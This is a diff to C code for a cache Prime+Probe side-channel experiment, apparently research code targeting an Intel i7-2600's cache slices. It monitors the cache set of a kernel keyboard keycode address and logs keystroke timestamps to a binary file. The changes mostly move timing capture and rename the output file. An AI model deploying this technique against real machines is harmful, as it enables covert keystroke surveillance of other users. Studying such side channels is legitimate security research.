@@ -154,6 +154,8 @@ uint64_t *profile_slices(int set) {
 
   uint64_t *size = malloc(4 * sizeof(uint64_t));
   int threshold = threshold_from_flush((void *)es_list[0]->head);
+  uint64_t start_time = __rdtscp(&core_id);
+  flush_timestamps(&start_time, sizeof(uint64_t), filename);
   for (int i = 0; i < 4; i++) {
     int slice = get_i7_2600_slice(pointer_to_pa((void *)es_list[i]->head));
     printf("testing slice index: %d\n", slice);
@@ -167,23 +169,26 @@ uint64_t *profile_slices(int set) {
   return size;
 }
 
-void measure_keystroke() {
+uint64_t measure_keystroke(int threshold) {
   int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
   int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
   int eslist_index = get_evset_index(slice);
   uint8_t probemap[1024 * 1024];
-  uint64_t keystrokes[64 * 64];
-  int threshold = threshold_from_flush((void *)es_list[0]->head);
+  uint64_t keystrokes[64 * 64 + 1];
 
   uint64_t num_keystrokes = 0;
+  uint64_t start_time = __rdtscp(&core_id);
+  flush_timestamps(&start_time, 1, "pp_keystrokes.bin");
+  printf("please start typing\n");
   for (int i = 0; i < 10; i++) {
     // takes around 1s to fill up 1 MB buffer
     uint64_t size = prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY,
                                 probemap, 1024 * 1024, keystrokes, threshold);
-    flush_timestamps(keystrokes, size, "keystrokes.bin");
+    flush_timestamps(keystrokes, size, "pp_keystrokes.bin");
     num_keystrokes += size;
   }
   printf("\nnum_keystrokes: %lu\n", num_keystrokes);
+  return start_time;
 }
 
 int main() {
@@ -199,11 +204,6 @@ int main() {
   // read_binary("output0.bin", slice_zero_times, timestamp_sizes[0]);
   // free(timestamp_sizes);
   es_list = get_all_slices_eviction_sets(mapping_start, 428);
-  printf("please start typing\n");
-  sleep(1);
-  uint64_t start_time = __rdtscp(&core_id);
-  printf("measure start-time: %lu\n", start_time);
-  measure_keystroke();
-  printf("%llu\n", __rdtscp(&core_id) - start_time);
+  measure_keystroke(threshold_from_flush(mapping_start));
   return 0;
 }
